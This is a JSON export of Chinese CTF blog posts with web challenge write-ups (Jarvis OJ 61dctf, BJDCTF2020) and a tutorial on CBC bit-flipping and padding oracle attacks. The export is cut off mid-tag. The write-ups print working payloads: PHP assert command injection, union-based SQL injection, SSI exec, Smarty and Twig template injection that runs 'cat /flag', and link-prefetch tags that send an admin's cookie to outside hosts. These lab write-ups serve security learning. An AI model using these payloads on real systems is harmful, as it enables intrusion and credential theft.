[{"title":"61dctfweb复现","url":"/2020/07/19/61dctf_web/","content":"<p>刷题平台+1</p>\n<a id=\"more\"></a>\n\n<p>平台地址：<a href=\"https://www.jarvisoj.com/\" target=\"_blank\" rel=\"noopener\">https://www.jarvisoj.com/</a></p>\n<h3 id=\"babyphp\"><a href=\"#babyphp\" class=\"headerlink\" title=\"babyphp\"></a>babyphp</h3><p>扫描一波发现git泄露</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719144256.png\" alt=\"\"></p>\n<p>githack把源码下下来，得到几个php文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719144836.png\" alt=\"\"></p>\n<p>index,php里除了html片段还有php，flag.php有flag但是不可读</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">if (isset($_GET[&#39;page&#39;])) &#123;</span><br><span class=\"line\">        $page &#x3D; $_GET[&#39;page&#39;];</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">        $page &#x3D; &quot;home&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$file &#x3D; &quot;templates&#x2F;&quot; . $page . &quot;.php&quot;;</span><br><span class=\"line\">assert(&quot;strops(&#39;$file&#39;, &#39;..&#39;) &#x3D;&#x3D;&#x3D; false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class=\"line\">assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719145815.png\" alt=\"\"></p>\n<p>因此我们的目的是把服务器中的flag.php读出来。</p>\n<p>想办法把命令注入到php当中去，php中能够用 and 和 | 来执行多条命令，假如我们传入<code>$page=&#39;,&#39;..&#39;)===false and system(&#39;cat templates/flag.php&#39;) and strop(&#39;</code></p>\n<p>那么<code>$file = templates/&#39;,&#39;..&#39;)===false and system(&#39;cat templates/flag.php&#39;) and strops(&#39;</code></p>\n<p>assert语句就变成了<code>assert(&quot;strops(&#39;templates/&#39;,&#39;..&#39;)===false and system(&#39;cat templates/flag.php&#39;) and strops(&#39;&#39;) === false&quot;)</code></p>\n<p>这样，中间的system就单独借助assert执行了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719152937.png\" alt=\"\"></p>\n<h3 id=\"admin\"><a href=\"#admin\" class=\"headerlink\" title=\"admin\"></a>admin</h3><p>dirsearch扫一波发现robots.txt，打开给出admin_s3cr3t.php</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719153324.png\" alt=\"\"></p>\n<p>访问给了个假flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719153521.png\" alt=\"\"></p>\n<p>cookie里有个admin=0，改成1即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719153752.png\" alt=\"\"></p>\n<h3 id=\"inject\"><a href=\"#inject\" class=\"headerlink\" title=\"inject\"></a>inject</h3><p>首页只有一个flag{xxx}，dirsearch依旧，发现有备份文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719155540.png\" alt=\"\"></p>\n<p>源码如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">require(&quot;config.php&quot;);</span><br><span class=\"line\">$table &#x3D; $_GET[&#39;table&#39;]?$_GET[&#39;table&#39;]:&quot;test&quot;;</span><br><span class=\"line\">$table &#x3D; Filter($table);</span><br><span class=\"line\">mysqli_query($mysqli,&quot;desc &#96;secret_&#123;$table&#125;&#96;&quot;) or Hacker();</span><br><span class=\"line\">$sql &#x3D; &quot;select &#39;flag&#123;xxx&#125;&#39; from secret_&#123;$table&#125;&quot;;</span><br><span class=\"line\">$ret &#x3D; sql_query($sql);</span><br><span class=\"line\">echo $ret[0];</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>用到了desc显示查询结果，mysql中，对于</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">desc &#96;1&#96; &#96;2&#96;;</span><br></pre></td></tr></table></figure>\n\n<p>如果1这个表存在，那么整个语句是能够正常执行的，那么我们构造</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#96; &#96;union select 1--+</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719162956.png\" alt=\"\"></p>\n<p>用limit把显示结果调换一下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719163454.png\" alt=\"\"></p>\n<p>那么对1这个位置注入</p>\n<p>表名：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#96; &#96;union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 1,1--+</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719163538.png\" alt=\"\"></p>\n<p>列名，嗯。。。单引号好像被过滤了，那么把表名转为16进制再传</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#96; &#96;union select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7365637265745f666c6167 limit 1,1--+</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719164102.png\" alt=\"\"></p>\n<p>flag：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#96; &#96;union select group_concat(flagUwillNeverKnow) from secret_flag limit 1,1--+</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719164337.png\" alt=\"\"></p>\n<h3 id=\"babyxss\"><a href=\"#babyxss\" class=\"headerlink\" title=\"babyxss\"></a>babyxss</h3><p>首页说可以发消息给管理员</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719130949.png\" alt=\"\"></p>\n<p>随便发一条试一下，verify用’0694’开头的字符串过不去，我估么着应该是少写了个md5，爆破一下即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import hashlib</span><br><span class=\"line\"></span><br><span class=\"line\">def func(md5_val):</span><br><span class=\"line\">    for x in range(999999, 100000000):</span><br><span class=\"line\">        md5_value&#x3D;hashlib.md5(str(x).encode(encoding&#x3D;&#39;utf-8&#39;)).hexdigest()</span><br><span class=\"line\">        if md5_value[:4]&#x3D;&#x3D;md5_val:</span><br><span class=\"line\">            return str(x)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class=\"line\">    print(func(&#39;9e87&#39;))</span><br></pre></td></tr></table></figure>\n\n<p>通过验证说管理员已经收到并且会查看</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719131442.png\" alt=\"\"></p>\n<p>开始想到的是xss把管理员的cookie带出来了，用xss平台的payload发现啥信息也收不到，抓包发现是设置了<strong>CSP</strong></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719131649.png\" alt=\"\"></p>\n<p>没了解过，正好学习一下</p>\n<p>CSP全称是内容安全策略，可以用于检测并削弱XSS的攻击性，它通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。</p>\n<p>配置CSP涉及到添加 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy\" target=\"_blank\" rel=\"noopener\"><code>Content-Security-Policy</code></a> HTTP头部到一个页面，并配置相应的值，以控制用户代理（浏览器等）可以为该页面获取哪些资源。</p>\n<p>指定策略格式如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Content-Security-Policy: policy</span><br></pre></td></tr></table></figure>\n\n<p>policy参数是一个包含了各种描述你的CSP策略指令的字符串。</p>\n<p>常见的策略方案可参考：<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></p>\n<p>这里我们可以看到添加了两个策略：<code>default-src &#39;self&#39;</code>; <code>script-src &#39;self&#39;</code>，也就是只能加载同源脚本。</p>\n<p>参考<a href=\"https://www.jianshu.com/p/f1de775bc43e\" target=\"_blank\" rel=\"noopener\">这位师傅</a>的文章了解到CSP策略可以被绕过，比如对link标签的预加载功能处理不当。</p>\n<p>Chrome下，可以使用如下标签发送cookie:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;link rel&#x3D;&quot;prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;xss.pt&#x2F;xxx&quot;&gt;</span><br></pre></td></tr></table></figure>\n\n<p>firefox下可以将cookie作为子域名，用dns预解析的方式把cookie带出去:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;link rel&#x3D;&quot;dns-prefetch&quot; href&#x3D;&quot;&#x2F;&#x2F;[cookie].xxx.ceye.io&quot;&gt;</span><br></pre></td></tr></table></figure>\n\n<p>不知道为啥不管用firefox还是chrome发过去啥反应没有。。。。。看了其他师傅好像这种情况挺多。。。那就放这吧先，看以后有没有机会搞清楚咋回事。</p>\n","categories":["CTF"],"tags":["xss","CSP","sql","bypass"]},{"title":"BJDCTF2020web复现","url":"/2020/07/03/BJD2020_web_wp/","content":"<p>二月份的比赛，前几天做ezphp的时候发现有其他web的题目，索性全都复现一下，有些是之前buu做过了</p>\n<a id=\"more\"></a>\n\n<p>docker环境：<a href=\"https://github.com/BjdsecCA/BJDCTF2020_January\" target=\"_blank\" rel=\"noopener\">https://github.com/BjdsecCA/BJDCTF2020_January</a></p>\n<p>平台：<a href=\"https://buuoj.cn\" target=\"_blank\" rel=\"noopener\">https://buuoj.cn</a></p>\n<h3 id=\"ezphp\"><a href=\"#ezphp\" class=\"headerlink\" title=\"ezphp\"></a>ezphp</h3><p>写在csdn上了，<a href=\"https://blog.csdn.net/qq_43756333/article/details/107034933\" target=\"_blank\" rel=\"noopener\">传送</a></p>\n<h3 id=\"easy-md5\"><a href=\"#easy-md5\" class=\"headerlink\" title=\"easy_md5\"></a>easy_md5</h3><p>打开靶机只有一个提交框</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200702214524.png\" alt=\"\"></p>\n<p>输啥都没有反应，抓了个包，返回头里看到hint</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200702214824.png\" alt=\"\"></p>\n<h4 id=\"考点：mysql特性，MD5函数特殊字符串，php强弱类型\"><a href=\"#考点：mysql特性，MD5函数特殊字符串，php强弱类型\" class=\"headerlink\" title=\"考点：mysql特性，MD5函数特殊字符串，php强弱类型\"></a>考点：mysql特性，MD5函数特殊字符串，php强弱类型</h4><p>php中MD5函数的处理方式如下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200702215403.png\" alt=\"\"></p>\n<p>由于会返回原始二进制格式，我们来看看<code>ffifdyop</code>字符串的结果</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200702215956.png\" alt=\"\"></p>\n<p>生成了’or’6以及一些不可见字符，那么再结合hint，他本来的语句是<br><code>select * from &#39;admin&#39; where password=&#39;传入处理后的值&#39;</code><br>当我们传入<code>ffifdyop</code>之后，就会变成<br><code>select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6xxxxxxx&#39;</code></p>\n<p>而在mysql中，判断条件时，以数字为开头的字符串会被当做是整型，均会返回1，也就是true</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200702221500.png\" alt=\"\"></p>\n<p>那么password的or判断就接收true并绕过了这个语句。</p>\n<p>传入之后跳转到了levels91.php，源码给出了php代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$a = $GET[<span class=\"string\">'a'</span>];</span><br><span class=\"line\">$b = $_GET[<span class=\"string\">'b'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class=\"line\">    header(<span class=\"string\">'Location: levell14.php'</span>);</span><br></pre></td></tr></table></figure>\n\n<p>一个简单的弱类型，可以利用科学计数法特性提交两个md5后以0e开头的字符串，或者直接变为数组两个NULL相等绕过。</p>\n<p>传入之后又跳转到levell14.php，强类型碰撞</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">\"flag.php\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_POST[<span class=\"string\">'param1'</span>]!==$_POST[<span class=\"string\">'param2'</span>]&amp;&amp;md5($_POST[<span class=\"string\">'param1'</span>])===md5($_POST[<span class=\"string\">'param2'</span>]))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>传入两个md5后值相等的字符串或一样用数组即可。</p>\n<h3 id=\"mark-loves-cat\"><a href=\"#mark-loves-cat\" class=\"headerlink\" title=\"mark loves cat\"></a>mark loves cat</h3><p>csdn上写过：<a href=\"https://blog.csdn.net/qq_43756333/article/details/106466696\" target=\"_blank\" rel=\"noopener\">传送</a></p>\n<h3 id=\"easy-search\"><a href=\"#easy-search\" class=\"headerlink\" title=\"easy_search\"></a>easy_search</h3><p>打开靶机一个登录框</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703144841.png\" alt=\"\"></p>\n<p>请求index.php.swp得源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\tob_start();</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_hash</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t$chars = <span class=\"string\">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span>;</span><br><span class=\"line\">\t\t$random = $chars[mt_rand(<span class=\"number\">0</span>,<span class=\"number\">73</span>)].$chars[mt_rand(<span class=\"number\">0</span>,<span class=\"number\">73</span>)].$chars[mt_rand(<span class=\"number\">0</span>,<span class=\"number\">73</span>)].$chars[mt_rand(<span class=\"number\">0</span>,<span class=\"number\">73</span>)].$chars[mt_rand(<span class=\"number\">0</span>,<span class=\"number\">73</span>)];<span class=\"comment\">//Random 5 times</span></span><br><span class=\"line\">\t\t$content = uniqid().$random;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> sha1($content); </span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    header(<span class=\"string\">\"Content-Type: text/html;charset=utf-8\"</span>);</span><br><span class=\"line\">\t***</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'username'</span>]) <span class=\"keyword\">and</span> $_POST[<span class=\"string\">'username'</span>] != <span class=\"string\">''</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $admin = <span class=\"string\">'6d0bc1'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( $admin == substr(md5($_POST[<span class=\"string\">'password'</span>]),<span class=\"number\">0</span>,<span class=\"number\">6</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;\"</span>;</span><br><span class=\"line\">            $file_shtml = <span class=\"string\">\"public/\"</span>.get_hash().<span class=\"string\">\".shtml\"</span>;</span><br><span class=\"line\">            $shtml = fopen($file_shtml, <span class=\"string\">\"w\"</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">\"Unable to open file!\"</span>);</span><br><span class=\"line\">            $text = <span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">            ***</span></span><br><span class=\"line\"><span class=\"string\">            ***</span></span><br><span class=\"line\"><span class=\"string\">            &lt;h1&gt;Hello,'</span>.$_POST[<span class=\"string\">'username'</span>].<span class=\"string\">'&lt;/h1&gt;</span></span><br><span class=\"line\"><span class=\"string\">            ***</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t***'</span>;</span><br><span class=\"line\">            fwrite($shtml,$text);</span><br><span class=\"line\">            fclose($shtml);</span><br><span class=\"line\">            ***</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"[!] Header  error ...\"</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;\"</span>;</span><br><span class=\"line\">            </span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t***</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t***</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到成功登录的关键，<code>$admin == substr(md5($_POST[&#39;password&#39;]),0,6)</code>，脚本爆破即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func</span><span class=\"params\">(md5_val)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">999999</span>, <span class=\"number\">100000000</span>):</span><br><span class=\"line\">        md5_value=hashlib.md5(str(x)).hexdigest()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> md5_value[:<span class=\"number\">6</span>]==md5_val:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> str(x)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    <span class=\"keyword\">print</span> func(<span class=\"string\">'6d0bc1'</span>)</span><br></pre></td></tr></table></figure>\n\n<p>跑出来结果是202066，登录看看，headers里返回了url</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703145648.png\" alt=\"\"></p>\n<p>访问之后发现会回显username的内容</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703145755.png\" alt=\"\"></p>\n<h4 id=\"考点：ssi代码执行注入\"><a href=\"#考点：ssi代码执行注入\" class=\"headerlink\" title=\"考点：ssi代码执行注入\"></a>考点：ssi代码执行注入</h4><p>ssi是服务器端包含的意思，就是在html中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p>\n<p>在这里， shtml文件可以执行 bash 命令，构造<code>&lt;!--#exec Cmd=&quot;ls&quot;--&gt;</code>即可命令执行，最后在ls ../找到flag文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703151212.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703151109.png\" alt=\"\"></p>\n<p>直接cat读取即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703151614.png\" alt=\"\"></p>\n<h3 id=\"the-mystery-of-ip\"><a href=\"#the-mystery-of-ip\" class=\"headerlink\" title=\"the mystery of ip\"></a>the mystery of ip</h3><p>打开靶机flag.php会显示出ip，抓包观察到xff头可以控制</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703152750.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703152726.png\" alt=\"\"></p>\n<h4 id=\"考点：smarty模板注入\"><a href=\"#考点：smarty模板注入\" class=\"headerlink\" title=\"考点：smarty模板注入\"></a>考点：smarty模板注入</h4><p>构造<code>4</code>会直接得到4</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703152931.png\" alt=\"\"></p>\n<p>猜测为模板注入，尝试读取配置文件构造<code></code>发现是smarty模板。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703153049.png\" alt=\"\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&#123;system(&#39;ls&#39;)&#125;&#125;或者&#123;if system(&#39;ls&#39;)&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure>\n\n<p>都可以执行命令，最后在根目录下找到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703153851.png\" alt=\"\"></p>\n<h3 id=\"Cookie-is-so-stable\"><a href=\"#Cookie-is-so-stable\" class=\"headerlink\" title=\"Cookie is so stable\"></a>Cookie is so stable</h3><p>打开靶机在flag.php有个提交框会把输入内容输出到网页上</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703154618.png\" alt=\"\"></p>\n<p>构造4发现还会返回计算结果4</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703154722.png\" alt=\"\"></p>\n<h4 id=\"考点：Twig模板注入\"><a href=\"#考点：Twig模板注入\" class=\"headerlink\" title=\"考点：Twig模板注入\"></a>考点：Twig模板注入</h4><p>发现在cookie处</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703154947.png\" alt=\"\"></p>\n<p>user会把输入的内容存进去，<code>urldecode(%7B%7B2%2B2%7D%7D)=4</code>,首先了解一下使用的是什么模板，在<a href=\"https://blog.csdn.net/u011377996/article/details/86776181\" target=\"_blank\" rel=\"noopener\">csdn师傅的一篇文章</a>找到流程图</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703155348.png\" alt=\"\"></p>\n<p>输入49成功回显，但Jinja2是基于python的模板引擎，那么只能是Twig了，百度一下Twig的payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于提交之后cookie会url编码处理，所以提交之后直接把cookie改回来即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703160726.png\" alt=\"\"></p>\n<h3 id=\"ZJCTF，不过如此\"><a href=\"#ZJCTF，不过如此\" class=\"headerlink\" title=\"ZJCTF，不过如此\"></a>ZJCTF，不过如此</h3><p>之前写在csdn上，<a href=\"https://blog.csdn.net/qq_43756333/article/details/106538180\" target=\"_blank\" rel=\"noopener\">传送</a></p>\n","categories":["CTF"],"tags":["bypass","ssi","ssti"]},{"title":"初探CBC字节翻转攻击","url":"/2020/07/15/CBC_thinking/","content":"<p>前几天复现NPUCTF碰到了一道CBC字节翻转的问题，因为从来没接触过，单独学习一下</p>\n<a id=\"more\"></a>\n\n<h3 id=\"CBC加密\"><a href=\"#CBC加密\" class=\"headerlink\" title=\"CBC加密\"></a>CBC加密</h3><p>参考： <a href=\"https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F\" target=\"_blank\" rel=\"noopener\">wiki百科</a><br>            <a href=\"https://blog.csdn.net/chengqiuming/article/details/82288851\" target=\"_blank\" rel=\"noopener\">CBC模式解读</a></p>\n<p>1976年，IBM发明了<strong>密码分组链接</strong>（CBC，Cipher-block chaining）模式。在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。</p>\n<p>其加解密示意图如下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200716155435.png\" alt=\"\"></p>\n<p>若第一个块的下标为1，则CBC模式的加密过程为</p>\n<ol>\n<li>首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。</li>\n<li>生成一个随机的初始化向量(IV)和一个密钥。</li>\n<li>将IV和第一组明文异或。</li>\n<li>用密钥对3中异或后产生的密文加密。</li>\n<li>用4中产生的密文对第二组明文进行异或操作。</li>\n<li>用密钥对5中产生的密文加密。</li>\n<li>重复4-7，到最后一组明文。</li>\n<li>将IV和加密后的密文拼接在一起，得到最终的密文。</li>\n</ol>\n<p>而其解密过程则为</p>\n<ol>\n<li>从密文中提取出IV，然后将密文分组。</li>\n<li>使用密钥对第一组的密文解密，然后和IV进行异或得到明文。</li>\n<li>使用密钥对第二组密文解密，然后和2中的密文异或得到明文。</li>\n<li>重复2-3，直到最后一组密文。</li>\n</ol>\n<p>CBC是最为常用的工作模式。它的主要缺点在于加密过程是串行的，无法被并行化，而且消息必须被填充到块大小的整数倍。解决后一个问题的一种方法是利用密文窃取。</p>\n<p>注意在加密时，明文中的微小改变会导致其后的全部密文块发生改变，而在解密时，从两个邻接的密文块中即可得到一个明文块。因此，解密过程可以被并行化，而解密时，密文中一位的改变只会导致其对应的明文块完全改变和下一个明文块中对应位发生改变，不会影响到其它明文的内容。</p>\n<h3 id=\"CBC字节翻转攻击\"><a href=\"#CBC字节翻转攻击\" class=\"headerlink\" title=\"CBC字节翻转攻击\"></a>CBC字节翻转攻击</h3><p>参考： <a href=\"https://blog.csdn.net/csu_vc/article/details/79619309\" target=\"_blank\" rel=\"noopener\">CBC翻转攻击，了解一下！</a><br>            <a href=\"https://blog.csdn.net/include_heqile/article/details/79942993\" target=\"_blank\" rel=\"noopener\">实验吧 简单的登录题 CBC字节翻转攻击</a><br>            <a href=\"https://www.jianshu.com/p/b2e8b2819d78\" target=\"_blank\" rel=\"noopener\">CBC字节翻转攻击</a></p>\n<p>攻击流程图(解密过程)</p>\n<p><img src=\"http://drops.xmd5.com/full/157b4078de6a8615e7c4be958d4d89164f1810e9.jpg\" alt=\"enter image description here\"></p>\n<p>图中我们可以得出下一块明文Plaintext是由前一块Ciphertext产生的，如果我们改变前一块Ciphertext中的一个字节，改变后的Ciphertext和下一块解密后的密文异或处理，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就可以欺骗服务端或者绕过过滤器。</p>\n<h3 id=\"Padding-oracle-attack\"><a href=\"#Padding-oracle-attack\" class=\"headerlink\" title=\"Padding oracle attack\"></a>Padding oracle attack</h3><p>参考： <a href=\"https://www.freebuf.com/articles/web/15504.html\" target=\"_blank\" rel=\"noopener\">我对Padding Oracle攻击的分析和思考</a><br>            <a href=\"https://www.freebuf.com/articles/database/151167.html\" target=\"_blank\" rel=\"noopener\">Padding oracle attack详细解析</a></p>\n<p>看的一脸懵逼，做个简单的摘录。。。</p>\n<p>首先了解<strong>分组密码的填充模式</strong>，分组密码Block Cipher需要在加载前确保每个每组的长度都是分组长度的整数倍。一般情况下，明文的最后一个分组很有可能会出现长度不足分组的长度，这个时候，普遍的做法是在最后一个分组后填充一个固定的值，这个值的大小为填充的字节总数。即假如最后还差4个字符，则填充0x04。这就是padding。</p>\n<p><img src=\"https://image.3001.net/uploads/image/20131028/20131028140730_78503.png\" alt=\"img\"></p>\n<p>而这时如果最后的Padding不正确，比如显示的是0x03但只填充了两个，则解密程序往往会抛出异常(Padding Error)。利用应用的错误回显，我们就可以判断出Paddig是否正确。</p>\n<p>而Padding Oracle Attack，是一种针对CBC链接模式的攻击，和具体的加密算法无关。它的核心是通过密文的中间值从而得到正确的密文，</p>\n<p>过程：</p>\n<blockquote>\n<p>（1）假设我们捕获到了传输的密文并且我们知道是CBC模式采用的什么加密算法，我们把密文按照加密算法的要求分好组，然后对倒数第二组密文进行构造；</p>\n<p>（2）先假定明文只填充了一字节，对倒数第二组密文的最后一字节从0x00到0xff逐个赋值并逐个向服务器提交，直到服务返回值表示构造后的密文可以正常解密，这意味着构造后的密文作为中间值（图中黄色的那一行）解密最后一组明文，明文的最后一位是0x01（如图所示），也就是说构造的倒数第二组密文的最后一字节与最后一组密文对应中间值（绿色的那一行）的最后一位相异或的结果是0x01；</p>\n<p><img src=\"https://image.3001.net/images/20171019/15083441758558.png!small\" alt=\"Padding oracle attack详细解析\"></p>\n<p>（3）利用异或运算的性质，我们把我们构造的密文的最后一字节与0x01异或便可得到最后一位密文解密后的中间值是什么，这里我们设为M1，这一过程其实就是对应下图CBC解密过程中红圈圈出来的地方，1就是我们想要得到的中间值，二就是我们构造的密文也就是最后一组密文的IV值，我们已经知道了plaintext的最后一字节是0x01，从图中可以看到它是由我们构造的IV值与中间值的最后一字节异或得到的；</p>\n<p><img 